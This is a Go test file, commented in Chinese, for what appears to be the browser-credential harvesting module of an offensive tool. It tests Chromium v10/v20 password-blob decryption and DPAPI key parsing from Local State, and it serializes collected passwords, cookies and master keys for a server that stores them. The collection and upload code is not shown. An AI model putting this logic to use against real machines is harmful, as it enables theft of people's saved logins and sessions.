package services

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"
)

// 浏览器凭据模块里**跨平台可测**的部分：密文解密、Local State 解析、制品序列化、
// 命令参数校验。Windows 专有的采集驱动（DPAPI、配置目录遍历）只能在 Windows 上验证。

// makeV10 用给定密钥造一条 v10 密文（12B nonce + 密文 + 16B tag）
func makeV10(t *testing.T, key, plain []byte) []byte {
	t.Helper()
	block, err := aes.NewCipher(key)
	if err != nil {
		t.Fatal(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatal(err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		t.Fatal(err)
	}
	sealed := gcm.Seal(nil, nonce, plain, nil)
	return append(append([]byte("v10"), nonce...), sealed...)
}

// makeV20 造一条 v20 密文：密钥 = SHA256(32B 前缀 || 主密钥)
func makeV20(t *testing.T, key, plain []byte) []byte {
	t.Helper()
	prefix := make([]byte, 32)
	if _, err := rand.Read(prefix); err != nil {
		t.Fatal(err)
	}
	derived := sha256.Sum256(append(append([]byte{}, prefix...), key...))
	block, err := aes.NewCipher(derived[:])
	if err != nil {
		t.Fatal(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatal(err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		t.Fatal(err)
	}
	sealed := gcm.Seal(nil, nonce, plain, nil)
	out := append([]byte("v20"), prefix...)
	out = append(out, nonce...)
	return append(out, sealed...)
}

func TestDecryptChromiumBlob(t *testing.T) {
	key := bytes.Repeat([]byte{0x42}, 32)
	secret := []byte("S3cr3t-P@ssw0rd-中文")

	t.Run("v10", func(t *testing.T) {
		got, err := decryptChromiumBlob(key, makeV10(t, key, secret))
		if err != nil {
			t.Fatalf("解密失败: %v", err)
		}
		if !bytes.Equal(got, secret) {
			t.Fatalf("明文 = %q，期望 %q", got, secret)
		}
	})

	t.Run("v20", func(t *testing.T) {
		got, err := decryptChromiumBlob(key, makeV20(t, key, secret))
		if err != nil {
			t.Fatalf("解密失败: %v", err)
		}
		if !bytes.Equal(got, secret) {
			t.Fatalf("明文 = %q，期望 %q", got, secret)
		}
	})

	t.Run("老格式明文", func(t *testing.T) {
		// 非 v10/v20 前缀：老版本或未加密，按明文返回
		got, err := decryptChromiumBlob(key, []byte("plain-old-value"))
		if err != nil || string(got) != "plain-old-value" {
			t.Fatalf("明文分支不符: %q %v", got, err)
		}
	})

	t.Run("太短", func(t *testing.T) {
		got, err := decryptChromiumBlob(key, []byte("v1"))
		if err != nil || string(got) != "v1" {
			t.Fatalf("过短输入应按明文处理: %q %v", got, err)
		}
	})

	t.Run("密钥不匹配必须报错", func(t *testing.T) {
		blob := makeV10(t, key, secret)
		wrong := bytes.Repeat([]byte{0x43}, 32)
		if _, err := decryptChromiumBlob(wrong, blob); err == nil {
			t.Fatal("换密钥后应解密失败")
		}
	})

	t.Run("密文被篡改必须报错", func(t *testing.T) {
		blob := makeV10(t, key, secret)
		blob[len(blob)-1] ^= 0xFF // 改 tag
		if _, err := decryptChromiumBlob(key, blob); err == nil {
			t.Fatal("篡改后应解密失败（GCM 认证）")
		}
	})

	t.Run("截断密文必须报错", func(t *testing.T) {
		blob := makeV10(t, key, secret)
		if _, err := decryptChromiumBlob(key, blob[:10]); err == nil {
			t.Fatal("截断的 v10 应报错")
		}
		v20 := makeV20(t, key, secret)
		if _, err := decryptChromiumBlob(key, v20[:20]); err == nil {
			t.Fatal("截断的 v20 应报错")
		}
	})
}

func TestDecodeLocalStateKey(t *testing.T) {
	protected := []byte("protected-dpapi-blob")
	blobB64 := base64.StdEncoding.EncodeToString(append([]byte("DPAPI"), protected...))
	state := map[string]interface{}{
		"os_crypt": map[string]string{"encrypted_key": blobB64},
	}
	raw, _ := json.Marshal(state)

	tech, got, err := decodeLocalStateKey(raw)
	if err != nil {
		t.Fatalf("解析失败: %v", err)
	}
	if tech != "dpapi" {
		t.Fatalf("技术 = %s，期望 dpapi", tech)
	}
	if !bytes.Equal(got, protected) {
		t.Fatalf("去前缀后的数据 = %q", got)
	}

	// 各类畸形输入都必须显式报错，不能返回半截数据
	bad := map[string][]byte{
		"不是 JSON":    []byte("{not json"),
		"没有字段":       []byte(`{"os_crypt":{}}`),
		"不是 base64":  []byte(`{"os_crypt":{"encrypted_key":"!!!not-base64!!!"}}`),
		"缺 DPAPI 前缀": raw0(t, "plain-key"),
	}
	for name, in := range bad {
		t.Run(name, func(t *testing.T) {
			if _, _, err := decodeLocalStateKey(in); err == nil {
				t.Fatal("应报错")
			}
		})
	}
}

func raw0(t *testing.T, s string) []byte {
	t.Helper()
	b, _ := json.Marshal(map[string]interface{}{
		"os_crypt": map[string]string{
			"encrypted_key": base64.StdEncoding.EncodeToString([]byte(s)),
		},
	})
	return b
}

func TestBrowserArtifactMarshal(t *testing.T) {
	art := CollectedBrowserArtifact{
		Host: "WS01", User: "alice",
		Errors: []string{"edge: 未安装"},
		Browsers: []CollectedProfile{{
			Name: "chrome", Profile: "Default", Tech: "v20", MasterKey: "AAECAwQ=",
			Credentials: []CollectedCredential{{URL: "https://x/", User: "u", Pass: "p"}},
			Cookies:     []CollectedCookie{{Host: ".x", Name: "sid", Value: "v"}},
		}},
	}
	raw, err := art.MarshalArtifact()
	if err != nil {
		t.Fatal(err)
	}
	if art.CollectedAt == "" {
		t.Fatal("序列化时应补上采集时间")
	}
	// 字段名必须与服务端 schema 一致（服务端按这些 key 解析入库）
	for _, key := range []string{`"browsers"`, `"credentials"`, `"cookies"`, `"master_key"`, `"host"`, `"user"`} {
		if !strings.Contains(string(raw), key) {
			t.Fatalf("制品 JSON 缺少字段 %s: %s", key, raw)
		}
	}
}

func TestIsProfileDir(t *testing.T) {
	for _, ok := range []string{"Default", "Profile 1", "Profile 12"} {
		if !isProfileDir(ok) {
			t.Fatalf("%s 应是配置目录", ok)
		}
	}
	for _, no := range []string{"", "profile 1", "Default2", "Crashpad", "ShaderCache", "System Profile"} {
		if isProfileDir(no) {
			t.Fatalf("%s 不应是配置目录", no)
		}
	}
}
